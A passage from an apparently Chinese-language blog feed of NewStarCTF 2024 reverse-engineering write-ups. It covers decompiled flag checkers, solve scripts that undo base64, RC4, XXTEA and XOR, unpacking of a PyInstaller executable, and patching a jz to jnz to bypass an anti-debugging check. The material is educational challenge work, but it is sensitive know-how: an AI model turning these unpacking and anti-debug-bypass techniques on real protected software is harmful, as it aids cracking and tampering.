smali">v35 = StringUTFChars;//base64 的结果赋值<br>v34 = -1<span class="hljs-class">LL;</span><br>v23 = __strlen_chk(StringUTFChars, -1<span class="hljs-class">LL);</span><br>v10 = v23;<br>v22 = v7;<br>v11 = &amp;v7[-((v23 + 15<span class="hljs-class">LL) &amp; 0xFFFFFFFFFFFFFFF0LL)];</span><br>v21 = v23;<br>for ( i = 0; i &lt; (int)v23; ++i )<br>  v11[i] = *(_BYTE *)(StringUTFChars + i);<br>for ( j = 0; ; ++j )<br>&#123;<br>  v8 = j;<br> <span class="hljs-built_in"> if </span>( j &gt;= (int)v23 / 2 )<br>    break;<br>  v5 = v11;<br>  v18 = v11[j];<br>  v11[j] = v11[v23 - j - 1];<br>  v5[v23 - j - 1] = v18;//将 v11[j] 和 v11[v23-j-1] 交换位置<br>&#125;<br>v17 = v11;<br>v16 = v11;<br>v15 = &amp;v11[v10];<br>while ( v16 != v15 )<br>&#123;<br>  v14 = v16;<br>  *v16 = ((int)(unsigned __int8)*v16 &gt;&gt; 4) | (16 * *v16);//循环右移 4 位<br>  ++v16;<br>&#125;<br>for ( k = 0; k &lt; (int)v23; ++k )<br>&#123;<br> <span class="hljs-built_in"> if </span>( (unsigned __int8)v11[k] != data_1[k] )<br>  &#123;<br>    v33 = 0;<br>    v12 = 1;<br>   <span class="hljs-built_in"> return </span>v33;<br>  &#125;<br>&#125;<br>v33 = 1;<br>v12 = 1;<span class="hljs-built_in"></span><br><span class="hljs-built_in">return </span>v33;<br></code></pre></td></tr></table></figure><p>所以逆向流程就是：循环移动 -&gt; 交换位置 -&gt; base64</p><p>将 <code>data_1</code> 数据提取出来</p><p><img src="https://img.dkdun.cn/v1/2024/12/cfa0a4036c1e3ed4.png"></p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>result = <span class="hljs-string">&quot;&quot;</span><br>enc = [<span class="hljs-number">0xB2</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xF4</span>,<br>       <span class="hljs-number">0x43</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x36</span>,<br>       <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x97</span>,<br>       <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x16</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    enc[i] = (enc[i] &lt;&lt; <span class="hljs-number">4</span> | enc[i] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)//<span class="hljs-number">2</span>):<br>    tmp = enc[i]<br>    enc[i] = enc[<span class="hljs-built_in">len</span>(enc) - i - <span class="hljs-number">1</span>]<br>    enc[<span class="hljs-built_in">len</span>(enc) - i - <span class="hljs-number">1</span>] = tmp<br><br>result = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> enc])<br>CHAR_DATA = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>NewStringUTF = <span class="hljs-string">&quot;BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/A&quot;</span><br><span class="hljs-built_in">print</span>(base64.b64decode(result.translate(<span class="hljs-built_in">str</span>.maketrans(NewStringUTF, CHAR_DATA))))<br><br>&gt;&gt;<span class="hljs-string">b&#x27;flag&#123;android_is_simple!&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="SecertsOfKawaii"><a href="#SecertsOfKawaii" class="headerlink" title="SecertsOfKawaii"></a>SecertsOfKawaii</h1><p>查看 <code>MainActivity</code> 代码，看起来好像被混淆了，乱乱的</p><p><img src="https://img.dkdun.cn/v1/2024/12/8d9abae0ff32d920.png"></p><p>可以使用 jeb 去混淆，解析成 Java 代码（怎么这些工具这么强啊啊啊啊）</p><p><img src="https://img.dkdun.cn/v1/2024/12/996d02236c2e81ab.png"></p><p>往下看代码流程，Java 层有一个 <code>RC4</code> 加密，<code>key</code>是 <code>rc4k4y</code>，加密后 <code>Base64</code> 一下传到 <code>so</code> 层，值在 <code>so</code> 层检查</p><p><img src="https://img.dkdun.cn/v1/2024/12/e545a4d1493aea08.png"></p><p><code>so</code> 文件有壳（以后都会记住要先查壳了），脱壳查看</p><p><img src="https://img.dkdun.cn/v1/2024/12/ce34a0c04606ef30.png"></p><p>xxtea（讨厌 tea 系列！！！），密钥是 <code>meow~meow~tea~~~</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/7dfbf02378d099da.png"></p><p>所以整个流程就是： xxtea -&gt; base64 -&gt; rc4 </p><p> 写 exp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">uint32_t</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0xdeadbeef</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="hljs-string">&lt;&lt; 3) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 2)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sbox[<span class="hljs-number">257</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-comment">//初始化 s 盒</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_sbox</span><span class="hljs-params">(<span class="hljs-type">char</span> *key)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i,j,k;<br>    <span class="hljs-type">int</span> tmp;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;i++)&#123;<br>        sbox[i]=i;<br>    &#125;<br>    j=k=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;i++)&#123;<br>        tmp=sbox[i];<br>        j=(j+tmp+key[k])%<span class="hljs-number">256</span>;<br>        sbox[i]=sbox[j];<br>        sbox[j]=tmp;<br>        <span class="hljs-keyword">if</span>(++k&gt;=<span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span>*)key))<br>            k=<span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//解密rc4</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, <span class="hljs-type">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i, j, k, R, tmp;<br><br>    <span class="hljs-built_in">init_sbox</span>(key);<br><br>    j = k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)data); i++)<br>    &#123;<br>        j = (j + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        k = (k + sbox[j]) % <span class="hljs-number">256</span>;<br><br>        tmp = sbox[j];<br>        sbox[j] = sbox[k];<br>        sbox[k] = tmp;<br><br>        R = sbox[(sbox[j] + sbox[k]) % <span class="hljs-number">256</span>];<br><br>        data[i] ^= R;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//解密 tea</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>)<br>    &#123;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++)<br>            &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>)<br>    &#123;<br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--)<br>            &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//base解密</span><br><span class="hljs-type">char</span> base64[<span class="hljs-number">65</span>] = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decodeBase64</span><span class="hljs-params">(<span class="hljs-type">char</span> *str, <span class="hljs-type">int</span> len, <span class="hljs-type">char</span> **in)</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-type">char</span> ascill[<span class="hljs-number">129</span>];<br>    <span class="hljs-type">int</span> i,k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++)<br>    &#123;<br>        ascill[base64[i]] = k++;<br>    &#125;<br>    <span class="hljs-type">int</span> decodeStrlen = len / <span class="hljs-number">4</span> * <span class="hljs-number">3</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span> *decodeStr= (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>) * decodeStrlen);<br>    k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>    &#123;<br>        decodeStr[k++] = (ascill[str[i]] &lt;&lt; <span class="hljs-number">2</span>) | (ascill[str[++i]] &gt;&gt; <span class="hljs-number">4</span>);<br>        <span class="hljs-keyword">if</span> (str[i + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        decodeStr[k++] = (ascill[str[i]] &lt;&lt; <span class="hljs-number">4</span>) | (ascill[str[++i]] &gt;&gt; <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">if</span> (str[i + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        decodeStr[k++] = (ascill[str[i]] &lt;&lt; <span class="hljs-number">6</span>) | (ascill[str[++i]]);<br>    &#125;<br>    decodeStr[k] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    *in = decodeStr;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> secrets[<span class="hljs-number">6</span>] =<br>            &#123;<span class="hljs-comment">//secrets数组</span><br>                    <span class="hljs-number">6866935238662214623LL</span>,<br>                    <span class="hljs-number">3247821795433987330LL</span>,<br>                    <span class="hljs-number">-3346872833356453065LL</span>,<br>                    <span class="hljs-number">1628153154909259154LL</span>,<br>                    <span class="hljs-number">-346581578535637655LL</span>,<br>                    <span class="hljs-number">3322447116203995091LL</span><br>            &#125;;<br>    <span class="hljs-built_in">btea</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)secrets, <span class="hljs-number">-12</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)<span class="hljs-string">&quot;meow~meow~tea~~~&quot;</span>);<br>    <span class="hljs-type">char</span> *flag;<br>    <span class="hljs-built_in">decodeBase64</span>((<span class="hljs-type">char</span> *)secrets, <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)secrets), &amp;flag);<br>    <span class="hljs-built_in">rc4</span>(<span class="hljs-string">&quot;rc4k4y&quot;</span>, (<span class="hljs-type">char</span> *)flag);<br>    <span class="hljs-built_in">puts</span>(flag);<br>&#125;<br></code></pre></td></tr></table></figure><p>好难好难好难 (((((T__T)))))</p><h1 id="PangBai-过家家（3）"><a href="#PangBai-过家家（3）" class="headerlink" title="PangBai 过家家（3）"></a>PangBai 过家家（3）</h1><p>发现附件是一个 python 编译的可执行文件，PyInstaller 是一个能把 <code>.py</code> 脚本打包成 <code>.exe</code> 的 python 库。</p><p><img src="https://img.dkdun.cn/v1/2024/12/fd9150cdeb260c60.png"></p><p>给它解包，可以使用 pyinstaller Extractor 进行解包。前提：1. 使用 pyinstaller 进行打包。2. 未加密</p><p>解包后文件放在以 exe 名字 +_extracted 的文件夹中</p><p><img src="https://img.dkdun.cn/v1/2024/12/0a2592d5412198ae.png"></p><p>找到和程序同名的 <code>NotNormalExe.pyc</code> 这个文件，用的 <a href="https://pylingual.io/">https://pylingual.io</a> 反编译它，反编译结果如下</p><p><img src="https://img.dkdun.cn/v1/2024/12/492a93c4478014b6.png"></p><p>就是一个简单的异或，重点是要解包反编译出来源码</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [<span class="hljs-number">40</span>, <span class="hljs-number">9</span>, <span class="hljs-number">22</span>, <span class="hljs-number">52</span>, <span class="hljs-number">15</span>, <span class="hljs-number">56</span>, <span class="hljs-number">66</span>, <span class="hljs-number">71</span>, <span class="hljs-number">111</span>, <span class="hljs-number">121</span>,<br>       <span class="hljs-number">90</span>, <span class="hljs-number">33</span>, <span class="hljs-number">18</span>, <span class="hljs-number">40</span>, <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">80</span>, <span class="hljs-number">28</span>, <span class="hljs-number">65</span>, <span class="hljs-number">68</span>, <span class="hljs-number">83</span>,<br>       <span class="hljs-number">88</span>, <span class="hljs-number">34</span>, <span class="hljs-number">86</span>, <span class="hljs-number">5</span>, <span class="hljs-number">12</span>, <span class="hljs-number">35</span>, <span class="hljs-number">82</span>, <span class="hljs-number">67</span>, <span class="hljs-number">3</span>, <span class="hljs-number">17</span>, <span class="hljs-number">79</span><br>       ]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>key = <span class="hljs-string">&#x27;NewStar2024&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>     enc[i] ^= <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])<br>     flag += <span class="hljs-built_in">chr</span>(enc[i])<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>只关于 Reverse</category>
      
      <category>赛题复现</category>
      
      <category>NewStarCTF 2024</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2024 Week2</title>
    <link href="/2024/11/11/%E5%A4%8D%E7%8E%B02/"/>
    <url>/2024/11/11/%E5%A4%8D%E7%8E%B02/</url>
    
    <content type="html"><![CDATA[<p>有 Java 代码审计，好难，Java 我讨厌你qwq，但是我觉得这些题出得太好啦，复现完学到了很多！！！</p><span id="more"></span><h1 id="Pangbai-泰拉记（1）"><a href="#Pangbai-泰拉记（1）" class="headerlink" title="Pangbai 泰拉记（1）"></a>Pangbai 泰拉记（1）</h1><p>ida 打开反汇编查看，<code>flag</code> 和一个 <code>key</code> 异或</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  std::ostream *v0; <span class="hljs-comment">// rax</span><br>  std::ostream *v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+24h] [rbp+4h]</span><br><br>  <span class="hljs-built_in">j___CheckForDebuggerJustMyCode</span>(&amp;_6D<span class="hljs-number">15E8</span>DE_Pangbai____1__Pangbai____1__1_cpp);<br>  v0 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(std::cout, <span class="hljs-string">&quot;Use your debugger to discover the hidden flag!&quot;</span>);<br>  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v0, std::endl&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; ++i )<br>    flag[i] ^= key[i];<br>  v1 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(std::cout, <span class="hljs-string">&quot;Click on the flag to obtain?&quot;</span>);<br>  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v1, std::endl&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<br>&#125;<br></code></pre></td></tr></table></figure><p>对 <code>key</code> 交叉引用能看见还没 <code>main0</code> 函数调用，进去看看</p><p><img src="https://img.dkdun.cn/v1/2024/12/15b058a1dd2841b6.png"></p><p>发现有两个函数 <code>IsDebuggerPresent()</code> 和 <code>CheckRemoteDebuggerPresent()</code>，这是两个反调试函数</p><p><img src="https://img.dkdun.cn/v1/2024/12/2d0da2054ad0d700.png"></p><p>对于 <code>CheckRemoteDebuggerPresent()</code> 函数：</p><p><code>kernel32</code> 的 <code>CheckRemoteDebuggerPresent() </code>函数用于检测指定进程是否正在被调试. <code>Remote</code> 指同一个机器中的不同进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">BOOL WINAPI CheckRemoteDebuggerPresent(<br>  _In_    HANDLE hProcess,<br>  _Inout_ PBOOL  pbDebuggerPresent<br>);<br></code></pre></td></tr></table></figure><p>如果说检测到正在被调试，那么 <code>pbDebuggerPresent</code> 指向的值会被设置为 <code>0xffffffff</code>。</p><p>对于这道题，调试一下可以看得出来流程，进程会跳转到右边这里，这里执行的是将 <code>key</code> 替换为不正确的 <code>key</code> ，所以可以将 <code>jz</code> 指令改为 <code>jnz</code> 指令，让程序跳转不了</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jz: </span><span class="hljs-keyword">Jump </span>if <span class="hljs-built_in">Zero</span>,零标志位 ZF=<span class="hljs-number">1</span> 时,<span class="hljs-keyword">jz </span>指令执行跳转<br><span class="hljs-keyword">jnz: </span><span class="hljs-keyword">Jump </span>if Not <span class="hljs-built_in">Zero</span>,零标志位 ZF=<span class="hljs-number">0</span> 时,<span class="hljs-keyword">jnz </span>指令执行跳转<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/82229bdabbecb98c.png"></p><p>然后进行调试</p><p><img src="https://img.dkdun.cn/v1/2024/12/c57b3908876d84ca.png"></p><p>提取数据，写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x69</span>,<br>        <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x20</span>,<br>        <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6D</span>,<br>        <span class="hljs-number">0x65</span>, <span class="hljs-number">0x3F</span>]<br>key = [<span class="hljs-number">0x05</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x5A</span>,<br>       <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x59</span>,<br>       <span class="hljs-number">0x26</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x09</span>,<br>       <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x42</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>):<br>    flag[i] ^= key[i]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag[i]), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="drink-tea"><a href="#drink-tea" class="headerlink" title="drink_tea"></a>drink_tea</h1><p>先读一遍流程，输入长度为 32 的字符串，进入 <code>sub_140001180</code>，然后再比较</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 